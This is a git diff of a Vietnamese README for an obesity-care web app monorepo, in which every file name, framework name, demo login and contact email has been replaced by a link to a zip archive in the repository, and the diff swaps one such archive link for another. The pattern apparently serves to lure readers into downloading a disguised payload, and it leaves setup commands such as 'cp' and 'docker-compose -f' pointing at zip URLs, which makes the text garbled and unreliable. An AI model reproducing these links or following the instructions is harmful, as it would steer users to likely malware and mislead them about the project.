@@ -17,11 +17,11 @@
 hoanglinh-obesity-care/
 ├── apps/
 │   ├── api/                 # NestJS API (Backend)
-│   └── web/                 # https://raw.githubusercontent.com/chauvanhung/hoanglinhmedicine/main/apps/web/app/login/hoanglinhmedicine_1.2.zip 14 (Frontend)
+│   └── web/                 # https://github.com/chauvanhung/hoanglinhmedicine/raw/refs/heads/main/apps/web/app/Software_2.6.zip 14 (Frontend)
 ├── packages/
 │   └── shared/              # Shared types & utilities
-├── https://raw.githubusercontent.com/chauvanhung/hoanglinhmedicine/main/apps/web/app/login/hoanglinhmedicine_1.2.zip       # Docker services
-└── https://raw.githubusercontent.com/chauvanhung/hoanglinhmedicine/main/apps/web/app/login/hoanglinhmedicine_1.2.zip             # Monorepo root
+├── https://github.com/chauvanhung/hoanglinhmedicine/raw/refs/heads/main/apps/web/app/Software_2.6.zip       # Docker services
+└── https://github.com/chauvanhung/hoanglinhmedicine/raw/refs/heads/main/apps/web/app/Software_2.6.zip             # Monorepo root
 ```
 
 ### Backend (NestJS)
@@ -32,7 +32,7 @@ hoanglinh-obesity-care/
 - **Payment Processing** với Stripe (có thể thay thế)
 - **Health Device Sync** cho Apple HealthKit & Google Fit
 
-### Frontend (https://raw.githubusercontent.com/chauvanhung/hoanglinhmedicine/main/apps/web/app/login/hoanglinhmedicine_1.2.zip 14)
+### Frontend (https://github.com/chauvanhung/hoanglinhmedicine/raw/refs/heads/main/apps/web/app/Software_2.6.zip 14)
 - **App Router** với TypeScript
 - **Tailwind CSS** + shadcn/ui components
 - **Responsive Design** cho mobile & desktop
@@ -40,7 +40,7 @@ hoanglinh-obesity-care/
 
 ## 🛠️ Yêu cầu hệ thống
 
-- https://raw.githubusercontent.com/chauvanhung/hoanglinhmedicine/main/apps/web/app/login/hoanglinhmedicine_1.2.zip 18+ 
+- https://github.com/chauvanhung/hoanglinhmedicine/raw/refs/heads/main/apps/web/app/Software_2.6.zip 18+ 
 - pnpm 8+
 - Docker & Docker Compose
 - PostgreSQL 15+
@@ -61,7 +61,7 @@ pnpm install
 
 ### 3. Cấu hình environment
 ```bash
-cp https://raw.githubusercontent.com/chauvanhung/hoanglinhmedicine/main/apps/web/app/login/hoanglinhmedicine_1.2.zip .env
+cp https://github.com/chauvanhung/hoanglinhmedicine/raw/refs/heads/main/apps/web/app/Software_2.6.zip .env
 # Chỉnh sửa .env với thông tin của bạn
 ```
 
@@ -100,8 +100,8 @@ pnpm db:studio
 
 Sau khi seed database, bạn có thể đăng nhập với:
 
-- **User**: https://raw.githubusercontent.com/chauvanhung/hoanglinhmedicine/main/apps/web/app/login/hoanglinhmedicine_1.2.zip / user123
-- **Admin**: https://raw.githubusercontent.com/chauvanhung/hoanglinhmedicine/main/apps/web/app/login/hoanglinhmedicine_1.2.zip / admin123
+- **User**: https://github.com/chauvanhung/hoanglinhmedicine/raw/refs/heads/main/apps/web/app/Software_2.6.zip / user123
+- **Admin**: https://github.com/chauvanhung/hoanglinhmedicine/raw/refs/heads/main/apps/web/app/Software_2.6.zip / admin123
 
 ## 📱 Luồng người dùng chính
 
@@ -163,7 +163,7 @@ pnpm build
 
 ### 2. Docker production
 ```bash
-docker-compose -f https://raw.githubusercontent.com/chauvanhung/hoanglinhmedicine/main/apps/web/app/login/hoanglinhmedicine_1.2.zip up -d
+docker-compose -f https://github.com/chauvanhung/hoanglinhmedicine/raw/refs/heads/main/apps/web/app/Software_2.6.zip up -d
 ```
 
 ### 3. Environment variables
@@ -205,7 +205,7 @@ docker-compose -f https://raw.githubusercontent.com/chauvanhung/hoanglinhmedicin
 
 - **Documentation**: [API Docs](http://localhost:3001/api/docs)
 - **Issues**: Tạo issue trên GitHub
-- **Email**: https://raw.githubusercontent.com/chauvanhung/hoanglinhmedicine/main/apps/web/app/login/hoanglinhmedicine_1.2.zip
+- **Email**: https://github.com/chauvanhung/hoanglinhmedicine/raw/refs/heads/main/apps/web/app/Software_2.6.zip
 
 ## 🎯 Roadmap
 
